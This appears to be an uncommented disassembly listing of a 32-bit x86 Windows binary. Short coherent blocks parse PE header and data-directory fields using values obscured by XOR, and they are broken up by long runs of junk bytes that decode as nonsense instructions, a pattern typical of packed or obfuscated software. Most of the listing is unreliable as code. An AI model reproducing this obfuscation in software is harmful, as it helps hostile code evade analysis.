  408dc6:	xchg   DWORD PTR [ecx-0x10],edi
  408dc9:	cwde   
  408dca:	push   0x8745a115
  408dcf:	and    edx,DWORD PTR [edi-0xe43c1a4]
  408dd5:	jmp    0x408e4e
  408dd7:	outs   dx,DWORD PTR ds:[esi]
  408dd8:	(bad)  
  408dd9:	call   0xba01:0xd8a0faab
  408de0:	(bad)  
  408de1:	dec    eax
  408de2:	cmp    al,dh
  408de4:	rcl    esp,cl
  408de6:	mov    eax,0xc583229f
  408deb:	cmp    dl,dl
  408ded:	in     al,0xa5
  408def:	push   es
  408df0:	test   BYTE PTR [eax-0x12],bh
  408df3:	push   ds
  408df4:	stos   BYTE PTR es:[edi],al
  408df5:	lahf   
  408df6:	push   ebp
  408df7:	mov    ds:0xc79bc140,eax
  408dfc:	push   eax
  408dfd:	adc    eax,DWORD PTR [ecx+ebx*8-0x66ba1f3b]
  408e04:	xor    al,0x4d
  408e06:	cmp    ebx,eax
  408e08:	ss mov dl,0x3d
  408e0b:	stos   DWORD PTR es:[edi],eax
  408e0c:	scas   eax,DWORD PTR es:[edi]
  408e0d:	iret   
  408e0e:	add    ecx,eax
  408e10:	jno    0x408dda
  408e12:	int    0x4d
  408e14:	into   
  408e15:	mov    DWORD PTR [ebp+0x3c],eax
  408e18:	pushf  
  408e19:	and    ecx,DWORD PTR [edx-0x36]
  408e1c:	paddsb mm2,QWORD PTR [edi-0x547b4529]
  408e23:	or     al,dh
  408e25:	xor    eax,0xfc458b66
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x9b873987
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	enter  0x3d8,0xc8
  408ec8:	les    ecx,FWORD PTR [edx-0x20]
  408ecb:	add    al,0x98
  408ecd:	dec    esi
  408ece:	inc    DWORD PTR [ecx-0x6e]
  408ed1:	add    al,0x8f
  408ed3:	xor    bl,al
  408ed5:	dec    esp
  408ed6:	repnz aam 0x4e
  408ed9:	cmp    BYTE PTR [edi-0xc],dh
  408edc:	xor    esp,edi
  408ede:	mov    eax,0x79722eb4
  408ee3:	aam    0x3f
  408ee5:	cs out 0xfe,al
  408ee8:	in     al,0x51
  408eea:	shr    esi,1
  408eec:	mov    esp,0xd2dd6552
  408ef1:	adc    ebp,DWORD PTR [esi-0x5f]
  408ef4:	sbb    BYTE PTR [ebx+ebp*8-0x5cd04ef4],dl
  408efb:	rcr    BYTE PTR [eax*4-0x1a16869b],0x99
  408f03:	mov    cl,0xc9
  408f05:	inc    esi
  408f06:	xchg   esp,eax
  408f07:	sub    al,0xa8
  408f09:	push   0x928c79b0
  408f0e:	mov    eax,ds:0xe07cea2b
  408f13:	in     al,0x95
  408f15:	ja     0x408efd
  408f17:	out    dx,al
  408f18:	xor    DWORD PTR [esi+0x14],ebx
  408f1b:	inc    esi
  408f1c:	push   ecx
  408f1d:	cdq    
  408f1e:	adc    al,0x2c
  408f20:	dec    eax
  408f21:	loope  0x408f46
  408f23:	les    ecx,FWORD PTR [edi+0x6d]
  408f26:	aaa    
  408f27:	jb     0x408f01
  408f29:	inc    ebx
  408f2a:	add    eax,0x7c4fb65f
  408f2f:	ss sub eax,0x1b7bc57d
  408f35:	jle    0x408f51
  408f37:	in     al,dx
  408f38:	inc    ebp
  408f39:	neg    DWORD PTR [eax-0x5b]
  408f3c:	ret    
  408f3d:	mov    al,0x5d
  408f3f:	rol    BYTE PTR [edx-0x33cb349c],cl
  408f45:	jno    0x408fa0
  408f47:	push   cs
  408f48:	jle    0x408f84
  408f4a:	sub    BYTE PTR [ebp-0x67],bl
  408f4d:	jecxz  0x408f85
  408f4f:	dec    esi
  408f50:	test   DWORD PTR [edx-0x23],esp
  408f53:	pop    edx
  408f54:	jns    0x408ee5
  408f56:	pushf  
  408f57:	xor    eax,0x2b0cb8d2
  408f5c:	jl     0x408fc0
  408f5e:	cld    
  408f5f:	mov    al,ds:0x895d32e5
  408f64:	addr16 mov edi,0xee9996d
  408f6a:	or     DWORD PTR [esi+0x7ea05a9b],esp
  408f70:	cmp    edi,esi
  408f72:	push   0x2da5789d
  408f77:	loopne 0x408fc4
  408f79:	sbb    al,0xc5
  408f7b:	mov    WORD PTR [esi+0x76697db6],ss
  408f81:	sub    BYTE PTR [ecx-0x1f],bl
  408f84:	mov    bh,0xe0
  408f86:	retf   
  408f87:	je     0x408fae
  408f89:	mul    BYTE PTR [ebx+eiz*4+0x63]
  408f8d:	stc    
  408f8e:	cmc    
  408f8f:	and    BYTE PTR [eax-0x792f49c1],ah
  408f95:	cmp    al,0xd4
  408f97:	lods   eax,DWORD PTR ds:[esi]
  408f98:	dec    edi
  408f99:	(bad)  
  408f9a:	addr16 aam 0x28
  408f9d:	xchg   ebp,eax
  408f9e:	ja     0x408fdf
  408fa0:	or     BYTE PTR [esi+0x3b318110],al
  408fa6:	bound  ebx,QWORD PTR [ebx+0x494dad43]
  408fac:	mov    BYTE PTR [ecx+0x648684d2],0xd2
  408fb3:	mov    WORD PTR [eax-0x54],gs
  408fb6:	add    ah,BYTE PTR [ecx-0x36]
  408fb9:	cld    
  408fba:	adc    ecx,DWORD PTR [edi]
  408fbc:	in     al,0x7f
  408fbe:	pop    esp
  408fbf:	mov    eax,0x87ca6a51
  408fc4:	pop    ecx
  408fc5:	(bad)  
  408fc6:	sbb    ecx,DWORD PTR [edx]
  408fc8:	xchg   DWORD PTR [eax],ebx
  408fca:	test   eax,0x85339cb5
  408fcf:	sbb    al,0xba
  408fd1:	adc    eax,0x4c2e0e0
  408fd6:	ja     0x409001
  408fd8:	gs ja  0x408f66
  408fdb:	idiv   DWORD PTR [edi]
  408fdd:	mov    BYTE PTR [ecx+0x23],0x46
  408fe1:	push   ss
  408fe2:	xor    ebp,DWORD PTR [ebp+0x2c399aa9]
  408fe8:	nop
  408fe9:	and    DWORD PTR [esi-0x30],ebx
  408fec:	push   cs
  408fed:	aam    0x20
  408fef:	or     BYTE PTR [edi],ah
  408ff1:	je     0x408fd9
  408ff3:	adc    DWORD PTR [edx],ecx
  408ff5:	pushf  
  408ff6:	outs   dx,DWORD PTR ds:[esi]
  408ff7:	jmp    0x408ff5
  408ff9:	cld    
  408ffa:	pop    es
  408ffb:	sub    BYTE PTR [ecx+edx*2-0x4c],0xf3
  409000:	dec    ebx
  409001:	xor    dh,BYTE PTR [edx]
  409003:	push   esi
  409004:	dec    ebx
  409005:	(bad)  
  409007:	repnz or al,0x2c
  40900a:	push   ebx
  40900b:	das    
  40900c:	out    0x80,al
  40900e:	xor    DWORD PTR fs:[ecx+0x11],edi
  409012:	xor    al,0xb4
  409014:	ret    
  409015:	jno    0x409059
  409017:	cmp    al,0xeb
  409019:	mov    bh,dh
  40901b:	pop    ecx
  40901c:	test   al,0x13
  40901e:	pop    esi
  40901f:	in     al,0xf8
  409021:	mov    bh,0x77
  409023:	fidivr DWORD PTR [eax+0x6c]
  409026:	(bad)  
  409027:	mov    ?,WORD PTR [esi]
  409029:	jle    0x408fc7
  40902b:	adc    eax,0x12c47b08
  409030:	jecxz  0x409095
  409032:	pop    eax
  409033:	fs (bad) 
  409036:	adc    DWORD PTR [ecx+eax*8],esi
  409039:	adc    BYTE PTR [edi+0x76035d5d],ch
  40903f:	mov    ch,0xf3
  409041:	inc    esp
  409042:	sub    ecx,0xb62fde4
  409048:	sub    DWORD PTR [ebx+0x14],esi
  40904b:	(bad)  
  40904c:	push   eax
  40904d:	(bad)  
  40904e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40904f:	jp     0x409061
  409051:	fcomp  DWORD PTR [edx-0x1d]
  409054:	jae    0x409048
  409056:	and    ebx,DWORD PTR es:[esi]
  409059:	adc    BYTE PTR [edx+0x4b795f72],0xe6
  409060:	pop    ecx
  409061:	add    esp,edi
  409063:	cdq    
  409064:	add    DWORD PTR [ecx+0x3e],ebx
  409067:	fwait
  409068:	add    ebx,DWORD PTR [ebp-0x19]
  40906b:	and    edx,edx
  40906d:	mov    esi,0xd5c1a660
  409072:	fisub  WORD PTR es:[eax-0x57]
  409076:	and    DWORD PTR [ebp+0x58feff7f],0xf14dcf47
  409080:	out    0xda,eax
  409082:	jo     0x409053
  409084:	mov    ebp,0x92d4d27c
  409089:	xchg   esp,eax
  40908a:	icebp  
  40908b:	arpl   WORD PTR [edi-0x6f],sp
  40908e:	out    0x55,eax
  409090:	int    0xe8
  409092:	jg     0x409014
  409094:	or     ah,0x8b
  409097:	js     0x409063
  409099:	push   cs
  40909a:	data16 icebp 
  40909c:	dec    edi
  40909d:	pop    ebx
  40909e:	test   DWORD PTR [esi+0x6747b09c],edx
  4090a4:	sub    eax,0xc3556e8a
  4090a9:	idiv   BYTE PTR ds:0xf95712df
  4090af:	jno    0x40912d
  4090b1:	loopne 0x409096
  4090b3:	push   esi
  4090b4:	mov    ds:0x65ae611b,al
  4090b9:	loop   0x409093
  4090bb:	test   BYTE PTR [esi+0x3c7b7944],dh
  4090c1:	ret    0x5744
  4090c4:	sub    esp,DWORD PTR [eax+eax*8+0xc]
  4090c8:	das    
  4090c9:	adc    eax,0x3c175a1f
  4090ce:	lods   al,BYTE PTR ds:[esi]
  4090cf:	cmc    
  4090d0:	mov    ds:0x38f07009,eax
  4090d5:	fs loop 0x4090ac
  4090d8:	mov    bh,0xa4
  4090da:	fmul   DWORD PTR [ebx]
  4090dc:	cwde   
  4090dd:	fcompp 
  4090df:	mov    al,ds:0xc43abed7
  4090e4:	imul   edx,edi,0x8d1585dd
  4090ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090eb:	or     al,0x75
  4090ed:	icebp  
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x73
  409163:	or     BYTE PTR [edi+0x7edf3213],0x7e
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	mov    ebp,0x685c9d50
  409173:	mov    eax,0x3e72343f
  409178:	popf   
  409179:	pop    ecx
  40917a:	ficomp WORD PTR [ecx+0x741da626]
  409180:	or     esp,DWORD PTR [ebp+ebx*1+0x50]
  409184:	ret    
  409185:	mov    ch,0x12
  409187:	arpl   cx,dx
  409189:	lds    esi,FWORD PTR [edi-0x72489133]
  40918f:	aas    
  409190:	xor    al,0xec
  409192:	ins    BYTE PTR es:[edi],dx
  409193:	mov    ch,0x7
  409195:	lea    eax,[ecx]
  409197:	mov    ds:0x1e7c10db,eax
  40919c:	push   ebp
  40919d:	mov    ch,BYTE PTR [ebx]
  40919f:	inc    ebx
  4091a0:	mov    cs,WORD PTR ds:0x2c6d4873
  4091a6:	les    ebx,FWORD PTR [ecx+0x59]
  4091a9:	fdivr  DWORD PTR [ebp-0x29]
  4091ac:	and    eax,0x5fc92cda
  4091b1:	xchg   esi,eax
  4091b2:	dec    ebp
  4091b3:	popa   
  4091b4:	mov    ecx,0x43426b2c
  4091b9:	fidivr DWORD PTR [esi-0x1a04a2f7]
  4091bf:	sbb    al,BYTE PTR [edi]
  4091c1:	cmc    
  4091c2:	sub    al,0x53
  4091c4:	cld    
  4091c5:	mov    esp,0x575067c5
  4091ca:	out    0x7a,al
  4091cc:	popa   
  4091cd:	and    edx,DWORD PTR [esi]
  4091cf:	loop   0x4091b7
  4091d1:	sbb    al,0xa8
  4091d3:	sub    cl,BYTE PTR [edx]
  4091d5:	adc    eax,0xe5fd076c
  4091da:	jle    0x4091ad
  4091dc:	repz push 0x2f9a7bc9
  4091e2:	inc    ebp
  4091e3:	retf   
  4091e4:	xor    eax,0xa2c86c74
  4091e9:	inc    ebp
  4091ea:	dec    ecx
  4091eb:	mov    eax,0x9d994019
  4091f0:	push   cs
  4091f1:	cmp    BYTE PTR [ebp+0xf5c2596],al
  4091f7:	je     0x409248
  4091f9:	cmp    BYTE PTR [eax+0x22],0x61
  4091fd:	pop    es
  4091fe:	inc    ebx
  4091ff:	and    al,0x54
  409201:	loope  0x4091bc
  409203:	imul   eax,DWORD PTR [edi+0x4aba5614],0x3e6748f6
  40920d:	(bad)
  409210:	or     al,0xcc
  409212:	sub    eax,0x1254c0bc
  409217:	cld    
  409218:	adc    bh,0x99
  40921b:	popa   
  40921c:	mov    edx,0x47e98e36
  409221:	mov    dh,0xb8
  409223:	retf   
  409224:	xor    ebp,DWORD PTR [ebx]
  409226:	neg    BYTE PTR [edi+0x22]
  409229:	ins    DWORD PTR es:[edi],dx
  40922a:	xor    al,0x76
  40922c:	sbb    eax,0x1fa85e81
  409231:	(bad)  
  409232:	xor    eax,0x44f5d01
  409237:	pop    esi
  409238:	jo     0x4092ab
  40923a:	lods   al,BYTE PTR ds:[esi]
  40923b:	xor    eax,0x838e9682
  409240:	jnp    0x4091cb
  409242:	xlat   BYTE PTR ds:[ebx]
  409243:	mul    bl
  409245:	xchg   ecx,eax
  409246:	pop    ss
  409247:	adc    BYTE PTR [edx-0x1d],ch
  40924a:	cs mov esp,cs
  40924d:	mov    eax,0xa9b3bc1b
  409252:	cmp    DWORD PTR ds:0x82687dff,ebx
  409258:	sub    DWORD PTR [ebx],0x1c
  40925b:	sbb    eax,0xcc7228bf
  409260:	mov    bh,0x9a
  409262:	shl    DWORD PTR [eax],1
  409264:	inc    eax
  409265:	jmp    0x3837:0xf351103
  40926c:	nop
  40926d:	in     al,dx
  40926e:	in     al,0x6a
  409270:	and    al,0xd2
  409272:	adc    esi,esp
  409274:	mov    DWORD PTR [esi+0x67],esp
  409277:	(bad)  
  409278:	clc    
  409279:	loope  0x409223
  40927b:	hlt    
  40927c:	pop    ebx
  40927d:	arpl   WORD PTR [esi-0x66],sp
  409280:	pop    es
  409281:	dec    ebp
  409282:	dec    eax
  409283:	mov    dh,dl
  409285:	pop    ss
  409286:	sub    al,0xc4
  409288:	sub    ah,BYTE PTR [esi]
  40928a:	rcr    BYTE PTR [ebp+0x2a06804c],cl
  409290:	jbe    0x409287
  409292:	mov    eax,ds:0x27fe9e57
  409297:	test   ah,bh
  409299:	xor    al,0xac
  40929b:	fistp  DWORD PTR ds:[esi+0x41]
  40929f:	xchg   esi,eax
  4092a0:	xor    eax,0xed1d30ad
  4092a5:	gs add eax,0x80c8534e
  4092ab:	xchg   ebp,eax
  4092ac:	adc    DWORD PTR [edx+ecx*4],edi
  4092af:	xchg   DWORD PTR [edx-0x7f7be24b],ebx
  4092b5:	shl    DWORD PTR [eax],1
  4092b7:	adc    eax,0x1e27cff0
  4092bc:	out    0xdc,al
  4092be:	jno    0x409267
  4092c0:	ret    0x69b5
  4092c3:	mov    dh,0x99
  4092c5:	cmp    ah,dh
  4092c7:	inc    eax
  4092c8:	mov    cl,0xb5
  4092ca:	scas   eax,DWORD PTR es:[edi]
  4092cb:	fcomi  st,st(4)
  4092cd:	cmp    eax,0x15fb6a69
  4092d2:	mov    ebx,0x306a9daf
  4092d7:	repnz inc DWORD PTR [edx+0x4a]
  4092db:	inc    esi
  4092dc:	add    eax,0x30dc5b1e
  4092e1:	add    edi,DWORD PTR [ecx]
  4092e3:	xchg   edi,eax
  4092e4:	xor    ch,BYTE PTR [edi]
  4092e6:	in     eax,dx
  4092e7:	pop    ebx
  4092e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092e9:	icebp  
  4092ea:	stos   BYTE PTR es:[edi],al
  4092eb:	jbe    0x4092eb
  4092ed:	mov    edi,0x61596dac
  4092f2:	out    0xb1,eax
  4092f4:	cmp    esi,DWORD PTR [edi-0x56d86a37]
  4092fa:	scas   eax,DWORD PTR es:[edi]
  4092fb:	fbstp  TBYTE PTR [ebp+0x5e]
  4092fe:	jp     0x4092ea
  409300:	shr    BYTE PTR [ebp+edx*1-0x5e3cfe5b],1
  409307:	add    DWORD PTR [edx],eax
  409309:	and    dh,BYTE PTR [ebx]
  40930b:	pop    eax
  40930c:	xchg   esi,eax
  40930d:	push   cs
  40930e:	mov    dh,0xdd
  409310:	out    0xa,al
  409312:	cmp    eax,0xb2018269
  409317:	mov    DWORD PTR [ecx],edx
  409319:	add    ebx,ebp
  40931b:	mov    BYTE PTR [edx-0x74],al
  40931e:	xor    eax,0x53f2da5a
  409323:	sub    ch,BYTE PTR [eax+0x8df0a6c]
  409329:	(bad)  
  40932b:	stos   DWORD PTR es:[edi],eax
  40932c:	in     al,dx
  40932d:	sbb    DWORD PTR [eax+0x49],0x97e60b79
  409334:	xchg   ebx,eax
  409335:	dec    ecx
  409336:	inc    ecx
  409337:	add    eax,esp
  409339:	les    esp,FWORD PTR [edx-0x5ad44203]
  40933f:	cmp    cl,BYTE PTR [edi]
  409341:	cmp    DWORD PTR [edx],esi
  409343:	fisub  WORD PTR [edi-0x46]
  409346:	pushf  
  409347:	xchg   ah,al
  409349:	in     al,dx
  40934a:	sbb    bl,al
  40934c:	(bad)  
  40934e:	shl    DWORD PTR [ecx+0x2],cl
  409351:	leave  
  409352:	stos   BYTE PTR es:[edi],al
  409353:	jne    0x4092ec
  409355:	imul   edx,DWORD PTR [esp+ebx*4],0xffffffff
  409359:	dec    si
  40935b:	ror    DWORD PTR [edx-0x1079795a],0x45
  409362:	and    DWORD PTR [edi-0x71],ecx
  409365:	arpl   WORD PTR [ebp-0x57a23af9],ax
  40936b:	jmp    0x1bf4:0xb692ccf3
  409372:	repnz inc esp
  409374:	jno    0x4093bc
  409376:	mov    ebx,edx
  409378:	push   esi
  409379:	mov    cl,0xff
  40937b:	mov    ss,WORD PTR [ebp+ebp*1-0x4da157f8]
  409382:	sahf   
  409383:	pop    edi
  409384:	gs and ebx,esi
  409387:	or     DWORD PTR [eax],ebp
  409389:	shr    BYTE PTR [edx],cl
  40938b:	out    dx,al
  40938c:	sbb    BYTE PTR [ebp-0x64136a02],0xcb
  409393:	lods   eax,DWORD PTR ds:[esi]
  409394:	xchg   esi,eax
  409395:	sbb    al,cl
  409397:	hlt    
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	repnz in al,0x6
  4093b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	data16 or al,0xe7
  4093c3:	cmp    ebx,0x7519cb16
  4093c9:	fs xchg esi,eax
  4093cb:	mov    bl,BYTE PTR es:[edx+0x4]
  4093cf:	push   cs
  4093d0:	push   ecx
  4093d1:	pushf  
  4093d2:	mov    WORD PTR [eax+ebp*8+0x23643298],es
  4093d9:	xor    DWORD PTR [esp+eax*2],esi
  4093dc:	rcr    DWORD PTR [edi],cl
  4093de:	ffreep st(7)
  4093e0:	dec    esp
  4093e1:	mov    ebp,0x7919ad6d
  4093e6:	inc    ebx
  4093e7:	add    BYTE PTR [eax+0xc],ch
  4093ea:	pop    eax
  4093eb:	ret    
  4093ec:	test   BYTE PTR ds:0xbda2682c,bh
  4093f2:	in     al,0x1e
  4093f4:	in     eax,0x26
  4093f6:	test   eax,0xbb213655
  4093fb:	adc    ah,BYTE PTR [ebp+0x7e]
  4093fe:	dec    ebx
  4093ff:	fcmovbe st,st(6)
  409401:	std    
  409402:	and    eax,DWORD PTR [ebp-0x67]
  409405:	out    0xc3,eax
  409407:	xor    bl,bh
  409409:	call   0xc076:0x38c376ce
  409410:	mov    eax,0x6e4f63a6
  409415:	test   al,0x6e
  409417:	mov    cl,0xee
  409419:	jns    0x40947a
  40941b:	out    0x7c,al
  40941d:	sub    BYTE PTR [edi-0x45],al
  409420:	add    dl,BYTE PTR [ebp-0x3de2432]
  409426:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409428:	push   0xffffffac
  40942a:	inc    ebx
  40942b:	mov    WORD PTR [edi+ebp*1-0x24ab1024],ss
  409432:	leave  
  409433:	pop    edx
  409434:	mov    edx,0xd6091c05
  409439:	std    
  40943a:	rcl    DWORD PTR [edi],1
  40943c:	jl     0x409422
  40943e:	adc    DWORD PTR [eax],edi
  409440:	add    al,0x77
  409442:	add    eax,0xb96f82d9
  409447:	loope  0x409488
  409449:	push   ax
  40944b:	ret    0xbb85
  40944e:	mov    ds:0x20e38487,al
  409453:	lds    ebx,FWORD PTR [esi-0x4964a21f]
  409459:	sub    ch,BYTE PTR [ebx*8-0x6450d379]
  409460:	mov    ch,0x3d
  409462:	mov    eax,0xd5f50ab8
  409467:	xor    DWORD PTR [edi+0x6232bc96],ecx
  40946d:	int    0xf
  40946f:	push   esi
  409470:	stos   BYTE PTR es:[di],al
  409472:	add    BYTE PTR [esi+0x56],ch
  409475:	mov    bl,0x74
  409477:	jns    0x4094f3
  409479:	addr16 push esp
  40947b:	(bad)  
  40947d:	xchg   edi,eax
  40947e:	xchg   BYTE PTR [esi-0x4e740bf7],dh
  409484:	push   ss
  409485:	in     al,0x4
  409487:	mov    ch,0xdb
  409489:	mov    esp,0x89e2e921
  40948e:	mov    dl,BYTE PTR [edi+eiz*2+0x2c69e649]
  409495:	jb     0x409461
  409497:	xor    al,0x4f
  409499:	arpl   bp,ax
  40949b:	(bad)  
  40949c:	cmc    
  40949d:	sahf   
  40949e:	mov    ebx,0xfef60ab6
  4094a3:	(bad)  
  4094a5:	jmp    0x7984a23e
  4094aa:	mov    al,0x72
  4094ac:	sbb    ecx,esp
  4094ae:	and    DWORD PTR ds:0x42950a81,0x5ce685fb
  4094b8:	jge    0x4094ac
  4094ba:	out    dx,eax
  4094bb:	or     cl,ch
  4094bd:	and    al,0x58
  4094bf:	sar    bh,1
  4094c1:	mov    al,ds:0x9f298393
  4094c6:	test   eax,0xc76de339
  4094cb:	mov    dh,0xad
  4094cd:	outs   dx,DWORD PTR ds:[esi]
  4094ce:	and    esp,DWORD PTR [eax+ebx*1]
  4094d1:	cdq    
  4094d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d3:	pop    esp
  4094d4:	cmp    edx,eax
  4094d6:	in     eax,0xef
  4094d8:	sub    edx,edx
  4094da:	mov    al,ds:0x875d6425
  4094df:	jle    0x4094ec
  4094e1:	pushf  
  4094e2:	(bad)  
  4094e3:	enter  0x269a,0xe5
  4094e7:	jecxz  0x4094e4
  4094e9:	push   esi
  4094ea:	popa   
  4094eb:	dec    esi
  4094ec:	clc    
  4094ed:	fsubr  DWORD PTR [edx+0x40a6a210]
  4094f3:	lea    esp,[ebp-0x47702e2]
  4094f9:	cli    
  4094fa:	repz mov ecx,0xf112ff98
  409500:	loope  0x4094fd
  409502:	outs   dx,DWORD PTR ds:[esi]
  409503:	out    dx,al
  409504:	lods   al,BYTE PTR ds:[esi]
  409505:	in     al,dx
  409506:	mov    ecx,0xa5139e3a
  40950b:	cwde   
  40950c:	daa    
  40950d:	mov    edx,0x3391f69e
  409512:	xor    DWORD PTR [ebx+0x4c7e765e],esp
  409518:	pmulhuw mm4,QWORD PTR [ecx-0x31]
  40951c:	mov    WORD PTR [edx+0x4b],ds
  40951f:	ss loopne 0x409575
  409522:	jmp    0x29f65ece
  409527:	in     al,0x7e
  409529:	(bad)  
  40952a:	pop    esp
  40952b:	xlat   BYTE PTR ds:[ebx]
  40952c:	call   0x8bf43986
  409531:	rcl    DWORD PTR [ecx+ebx*2+0x6a],0x6a
  409536:	shl    BYTE PTR [ebp+0x7b],0xfa
  40953a:	mov    dl,0xc2
  40953c:	push   ebx
  40953d:	aas    
  40953e:	xor    bh,ch
  409540:	or     eax,0x7e54bd7c
  409545:	xchg   ebx,eax
  409546:	fdivr  DWORD PTR [ebx-0x49]
  409549:	push   ss
  40954a:	dec    esp
  40954b:	in     al,dx
  40954c:	push   ecx
  40954d:	inc    ebx
  40954e:	add    DWORD PTR [ecx],esi
  409550:	daa    
  409551:	xchg   DWORD PTR [esi+0x58465a32],edi
  409557:	fcomi  st,st(3)
  409559:	icebp  
  40955a:	scas   eax,DWORD PTR es:[edi]
  40955b:	pop    ecx
  40955c:	add    ah,BYTE PTR [ebp+0x73197987]
  409562:	int    0xac
  409564:	mov    esp,0x26697b6d
  409569:	ja     0x409532
  40956b:	push   eax
  40956c:	mov    ch,0xc2
  40956e:	cwde   
  40956f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409570:	push   esi
  409571:	add    DWORD PTR [ecx],ecx
  409573:	and    eax,0xfc140946
  409578:	popa   
  409579:	into   
  40957a:	in     al,dx
  40957b:	rcr    ecx,0x42
  40957e:	inc    esp
  40957f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409580:	cmp    al,0x70
  409582:	(bad)  
  409584:	call   DWORD PTR [ebx-0x12]
  409587:	mov    ecx,0x6a4ef760
  40958c:	nop
  40958d:	loope  0x40959b
  40958f:	or     eax,0x5b10b3d9
  409594:	ret    0xe2bf
  409597:	sub    BYTE PTR [ebx],cl
  409599:	mov    ah,0xab
  40959b:	add    BYTE PTR [edi],dh
  40959d:	gs scas eax,DWORD PTR es:[edi]
  40959f:	sbb    eax,0xefc924c8
  4095a4:	outs   dx,DWORD PTR ds:[esi]
  4095a5:	jb     0x409570
  4095a7:	mov    ds:0x9b870381,eax
  4095ac:	lock xchg edx,eax
  4095ae:	cdq    
  4095af:	rcl    BYTE PTR [ebp+edx*1-0x7b],cl
  4095b3:	jns    0x409544
  4095b5:	popa   
  4095b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095b7:	sbb    esi,DWORD PTR [ecx+0x1c757be3]
  4095bd:	fadd   DWORD PTR [eax+0x6e583177]
  4095c3:	xor    esp,DWORD PTR [ebx+0x559c8536]
  4095c9:	jp     0x40962f
  4095cb:	pushf  
  4095cc:	cmp    al,0x49
  4095ce:	jecxz  0x409600
  4095d0:	es (bad) 
  4095d3:	push   edx
  4095d4:	loop   0x409648
  4095d6:	sbb    DWORD PTR fs:[esi+0x2019cfa6],0x55ca9a59
  4095e1:	sti    
  4095e2:	in     eax,0x16
